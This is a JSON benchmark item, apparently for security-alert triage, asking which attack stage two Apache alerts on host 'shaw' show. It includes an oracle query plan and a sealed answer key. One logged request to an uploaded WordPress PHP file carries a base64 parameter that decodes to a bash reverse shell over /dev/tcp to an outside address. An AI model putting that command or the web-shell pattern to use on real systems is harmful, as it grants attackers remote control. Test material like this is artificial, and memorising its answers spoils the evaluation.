@@ -1,0 +1,168 @@
+{
+  "incident_id": "ait-shaw-reverse_shell",
+  "name": "AIT-ADS shaw/reverse_shell",
+  "source_benchmark": "Cyber-AIT-ADS",
+  "source_scenario": "shaw/reverse_shell",
+  "alert": {
+    "timestamp": "2022-01-29T15:20:15Z",
+    "host": "shaw",
+    "user": "unknown",
+    "alert_type": "ait_ads_stage",
+    "summary": "AIT-ADS multi-step stage candidate on shaw. Identify the attack stage from telemetry."
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "alerts"
+    ],
+    "start": "2022-01-29T15:20:15Z",
+    "end": "2022-01-29T15:20:39Z",
+    "hosts": [
+      "shaw"
+    ]
+  },
+  "telemetry": {
+    "alerts": [
+      {
+        "event_id": "ait-0001-6e97274e",
+        "timestamp": "2022-01-29T15:20:15Z",
+        "host": "shaw",
+        "detector": "AMiner: Unusual occurrence frequencies of Apache Access logs.",
+        "message": "::1 - - [29/Jan/2022:15:20:15 +0000] \"OPTIONS * HTTP/1.0\" 200 110 \"-\" \"Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)\"",
+        "raw_alert": {
+          "timestamp": 1643469615.0,
+          "detector": "AMiner: Unusual occurrence frequencies of Apache Access logs.",
+          "message": "::1 - - [29/Jan/2022:15:20:15 +0000] \"OPTIONS * HTTP/1.0\" 200 110 \"-\" \"Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)\""
+        }
+      },
+      {
+        "event_id": "ait-0002-a836ad06",
+        "timestamp": "2022-01-29T15:20:39Z",
+        "host": "shaw",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.24.249.224 - - [29/Jan/2022:15:20:39 +0000] \"GET /wp-content/uploads/2022/01/zrhrldsngi-1643467181.254.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC43MC4zMy4yMDIvNTU4MDE7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506735 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1643469639.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.24.249.224 - - [29/Jan/2022:15:20:39 +0000] \"GET /wp-content/uploads/2022/01/zrhrldsngi-1643467181.254.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC43MC4zMy4yMDIvNTU4MDE7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506735 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "ait-0001-6e97274e",
+      "source": "alerts",
+      "timestamp": "2022-01-29T15:20:15Z",
+      "host": "shaw",
+      "fields": {
+        "detector": "AMiner: Unusual occurrence frequencies of Apache Access logs.",
+        "message": "::1 - - [29/Jan/2022:15:20:15 +0000] \"OPTIONS * HTTP/1.0\" 200 110 \"-\" \"Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)\"",
+        "raw_alert": {
+          "timestamp": 1643469615.0,
+          "detector": "AMiner: Unusual occurrence frequencies of Apache Access logs.",
+          "message": "::1 - - [29/Jan/2022:15:20:15 +0000] \"OPTIONS * HTTP/1.0\" 200 110 \"-\" \"Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0002-a836ad06",
+      "source": "alerts",
+      "timestamp": "2022-01-29T15:20:39Z",
+      "host": "shaw",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.24.249.224 - - [29/Jan/2022:15:20:39 +0000] \"GET /wp-content/uploads/2022/01/zrhrldsngi-1643467181.254.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC43MC4zMy4yMDIvNTU4MDE7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506735 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1643469639.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.24.249.224 - - [29/Jan/2022:15:20:39 +0000] \"GET /wp-content/uploads/2022/01/zrhrldsngi-1643467181.254.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC43MC4zMy4yMDIvNTU4MDE7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506735 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "shaw"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "shaw"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "AIT-ADS multi-step stage candidate on shaw. Identify the attack stage from telemetry.",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "shaw"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "shaw"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "AIT-ADS multi-step stage candidate on shaw. Identify the attack stage from telemetry.",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "Cyber-AIT-ADS",
+    "scenario": "shaw/reverse_shell",
+    "answer": "reverse_shell",
+    "accept": [
+      "reverse_shell",
+      "reverse shell"
+    ],
+    "grading": "exact_ci",
+    "sealed": true
+  }
+}
